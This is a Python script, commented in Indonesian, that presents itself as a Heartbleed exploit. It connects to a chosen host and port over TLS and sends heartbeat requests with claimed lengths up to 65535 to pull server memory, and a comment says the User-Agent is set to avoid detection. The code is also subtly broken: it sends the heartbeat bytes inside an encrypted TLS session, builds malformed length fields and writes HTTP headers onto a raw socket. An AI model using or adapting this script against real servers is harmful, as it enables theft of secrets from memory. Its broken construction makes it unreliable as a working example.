import socket
import struct
import sys
import ssl
import time

def heartbleed(hostname, port):
    try:
        context = ssl.create_default_context()
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(5)
        s_wrapped = context.wrap_socket(s, server_hostname=hostname)
        s_wrapped.connect((hostname, port))

        # User-Agent untuk menghindari deteksi
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3"
        }
        for header, value in headers.items():
            s_wrapped.sendall(f"{header}: {value}\r\n".encode())
        s_wrapped.sendall(b"\r\n")

        # variasi permintaan Heartbleed - dimana panjang payload yang berbeda
        payload_lengths = [1, 3, 10, 100, 1000, 65535]  # Panjang payload yang berbeda
        for payload_length in payload_lengths:
            hb = b"\x18\x03\x03\x00" + struct.pack(">H", payload_length + 3) + b"\x01" + bytes([payload_length])
            s_wrapped.sendall(hb)
            time.sleep(0.5)  # waktu delay untuk mengirimkan selanjutnya

            # Receive response
            response = b""
            while True:
                try:
                    data = s_wrapped.recv(4096)
                    if not data:
                        break
                    response += data
                except socket.timeout:
                    break

            if response:
                print(f"Respons untuk payload_length={payload_length}:")
                print(response.hex())  # Cetak respons dalam format heksadesimal
                if len(response) > payload_length + 3:
                    print("Kemungkinan rentan terhadap Heartbleed (respons terlalu panjang)")
                else:
                    print("Kemungkinan tidak rentan terhadap Heartbleed")
            else:
                print(f"Tidak ada respons untuk payload_length={payload_length}")

    except ConnectionRefusedError:
        print("Koneksi ditolak. Pastikan host dan port benar.")

    except socket.timeout:
        print("Timeout. Server mungkin tidak merespons.")

    except Exception as e:
        print(f"Terjadi kesalahan: {e}")

    finally:
        s_wrapped.close()

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Penggunaan: python3 heartbleed.py <hostname> <port>")
    else:
        heartbleed(sys.argv[1], int(sys.argv[2]))
